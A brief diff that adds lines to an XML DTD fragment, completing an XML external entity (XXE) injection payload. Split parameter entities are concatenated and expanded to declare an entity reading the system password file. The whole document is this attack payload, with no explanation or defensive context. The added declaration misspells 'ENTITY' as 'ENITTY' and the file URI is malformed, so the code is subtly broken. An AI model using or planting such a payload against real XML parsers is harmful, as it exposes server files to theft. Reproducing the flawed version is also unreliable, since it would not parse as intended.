@@ -1,3 +1,5 @@
 <!ENTITY % t1 "<!ENTITY xxe">
 <!ENTITY % t2 "SYSTEM">
 <!ENTITY % t3 "'file://etc/passwd'>">
+<!ENITTY % all "%t1;%t2;%t3;">
+%all;
